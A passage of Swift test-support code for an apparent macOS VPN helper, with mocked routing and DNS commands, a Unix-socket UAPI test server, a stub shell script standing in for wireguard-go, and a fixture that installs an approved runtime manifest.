        if failing.contains(where: { line.hasPrefix($0) }) { return CommandResult(status: 1, output: "route: writing to routing socket: File exists") }
        switch (tool as NSString).lastPathComponent {
        case "netstat":
            if arguments.contains("inet6") {
                return CommandResult(status: 0, output: "Routing tables\n\nInternet6:\nDestination Gateway Flags Netif Expire\ndefault fe80::1%en0 UGcg en0\n")
            }
            return CommandResult(status: 0, output: "Routing tables\n\nInternet:\nDestination Gateway Flags Netif Expire\ndefault link#23 UCSIg utun5\ndefault \(gateway4) UGScg en0\n")
        case "ifconfig" where arguments.count == 1:
            return CommandResult(status: 0, output: "\(arguments[0]): flags=8863<UP,BROADCAST,RUNNING> mtu 1500\n")
        case "route" where arguments.contains("get"):
            let destination = arguments.last!
            if let gateway = lock.withLock({ routes[destination] }) {
                return CommandResult(status: 0, output: "destination: \(destination)\ngateway: \(gateway)\ninterface: en0\n")
            }
            return CommandResult(status: 1, output: "route: route has not been found\n")
        case "route" where arguments.contains("add") && arguments.contains("-gateway"):
            let index = arguments.firstIndex(of: "-gateway")!
            let destination = arguments[index - 1], gateway = arguments[index + 1]
            return lock.withLock {
                guard routes[destination] == nil else { return CommandResult(status: 1, output: "File exists") }
                routes[destination] = gateway
                return CommandResult(status: 0, output: "")
            }
        case "route" where arguments.contains("delete"):
            let destination = arguments[4]
            return lock.withLock {
                guard routes.removeValue(forKey: destination) != nil else { return CommandResult(status: 1, output: "not found") }
                return CommandResult(status: 0, output: "")
            }
        default:
            return CommandResult(status: 0, output: "")
        }
    }
    func resolve(_ host: String, port: Int) -> [String] { ["2001:db8::7", "198.51.100.7"] }
    func uapi(interface: String, pid: pid_t, request: String) throws -> String {
        lock.withLock { _uapi.append((interface, pid, request)) }
        return request.hasPrefix("get=1") ? "public_key=00\nlast_handshake_time_sec=1700000000\nerrno=0\n\n" : "errno=0\n\n"
    }
    func primaryService() -> String? { primary }
    func dnsSetup(service: String) -> [String: Any]? { dns[service] }
    func setDNSSetup(service: String, value: [String: Any]?) -> Bool {
        lock.withLock { _dns[service] = value }
        return true
    }
}

/// One-connection UAPI server on a Unix socket, served by this process.
final class UAPITestServer: @unchecked Sendable {
    private let fd: Int32
    private let lock = NSLock()
    private var _received = ""
    var received: String { lock.withLock { _received } }

    init(path: String, reply: String) throws {
        fd = socket(AF_UNIX, SOCK_STREAM, 0)
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        let bytes = Array(path.utf8)
        withUnsafeMutableBytes(of: &address.sun_path) { raw in raw.copyBytes(from: bytes); raw[bytes.count] = 0 }
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { bind(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size)) }
        }
        guard bound == 0, listen(fd, 4) == 0 else { throw TestSupport.Failure("Servidor UAPI de teste não iniciou") }
        let listener = fd
        Thread { [self] in
            while true {
                let client = accept(listener, nil, nil)
                guard client >= 0 else { return }
                var buffer = [UInt8](repeating: 0, count: 4096)
                var text = ""
                while !text.hasSuffix("\n\n") {
                    let count = Darwin.read(client, &buffer, buffer.count)
                    guard count > 0 else { break }
                    text += String(decoding: buffer.prefix(count), as: UTF8.self)
                }
                lock.withLock { _received = text }
                _ = Array(reply.utf8).withUnsafeBytes { Darwin.write(client, $0.baseAddress, $0.count) }
                Darwin.close(client)
            }
        }.start()
    }
    func close() { shutdown(fd, SHUT_RDWR); Darwin.close(fd) }
}

extension HelperFixture {
    /// Script standing in for wireguard-go: reports the utun like the real one (name file and
    /// log prefix), never reads fd 3, and exits on SIGTERM.
    static let wireGuardScript = """
    #!/bin/sh
    echo "ARGS=$*"
    echo "ENV=$WG_TUN_NAME_FILE|$LOG_LEVEL"
    printf 'utun42\\n' > "$WG_TUN_NAME_FILE"
    echo "DEBUG: (utun42) 2026/10/24 12:00:00 Starting wireguard-go version 0.0.fixture"
    trap 'echo "INFO: (utun42) 2026/10/24 12:00:09 Shutting down"; exit 0' TERM
    while :; do /bin/sleep 1 & wait $!; done
    """

    /// Approved wireguard-go copy in the store's format, next to an existing openfortivpn one.
    func installFixtureWireGuardRuntime() throws {
        try store.prepareDirectories()
        let id = "abcdefabcdefabcdefabcdef"
        let base = store.runtimes + "/" + id
        for directory in [base, base + "/bin", base + "/lib", base + "/lib/ossl-modules", base + "/lib/engines", base + "/etc"] {
            guard mkdir(directory, 0o755) == 0 || errno == EEXIST else { throw TestSupport.Failure("mkdir \(directory)") }
        }
        func write(_ relative: String, _ data: Data, _ mode: Int) throws -> [String: Any] {
            let path = base + "/" + relative
            try? FileManager.default.removeItem(atPath: path)
            guard FileManager.default.createFile(atPath: path, contents: data), chmod(path, mode_t(mode)) == 0 else {
                throw TestSupport.Failure("Não foi possível criar \(relative)")
            }
            return ["path": relative, "sha256": TestSupport.sha256(data), "mode": mode]
        }
        let files = [try write("bin/wireguard-go", Data(Self.wireGuardScript.utf8), 0o555),
                     try write("etc/openssl.cnf", Data("# vazio\n".utf8), 0o444)]
        let manifest: [String: Any] = [
            "format": 1, "id": id, "approvedAt": Date().timeIntervalSince1970, "approvedByUID": getuid(), "kind": "wireguard",
            "version": "fixture-wg", "inventoryDigest": "fixture-wg", "sourcePath": "/fixture/wireguard-go", "sourceSHA256": "0",
            "capabilities": ["cookieOnStdin": false, "captureCookie": false, "samlPort": false],
            "files": files, "sources": [], "systemLibraries": [], "notes": []]
        let manifestPath = base + "/manifest.json"
        try? FileManager.default.removeItem(atPath: manifestPath)
        guard FileManager.default.createFile(atPath: manifestPath, contents: try JSONSerialization.data(withJSONObject: manifest)),
              chmod(manifestPath, 0o444) == 0 else { throw TestSupport.Failure("manifesto") }
        var state = (try? JSONSerialization.jsonObject(with: Data(contentsOf: URL(fileURLWithPath: store.statePath)))) as? [String: Any]
            ?? ["format": 1, "authorizedUsers": [getuid()]]
        state["activeWireGuardRuntime"] = id
        try? FileManager.default.removeItem(atPath: store.statePath)
        guard FileManager.default.createFile(atPath: store.statePath, contents: try JSONSerialization.data(withJSONObject: state)),
              chmod(store.statePath, 0o644) == 0 else { throw TestSupport.Failure("estado") }
    }
}
